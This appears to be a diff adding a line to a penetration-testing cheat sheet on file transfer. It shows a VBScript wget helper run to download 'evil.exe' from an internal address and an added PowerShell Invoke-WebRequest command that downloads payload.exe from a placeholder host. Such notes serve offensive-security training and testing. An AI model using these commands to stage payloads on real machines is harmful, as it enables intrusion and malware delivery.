@@ -108,4 +108,7 @@ echo ts.Close >> wget.vbs
 cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
 ```
 
+## Download powershell
+
+IWR -uri http://xx.xx.xx.xx/payload.exe -outfile payload.exe
 
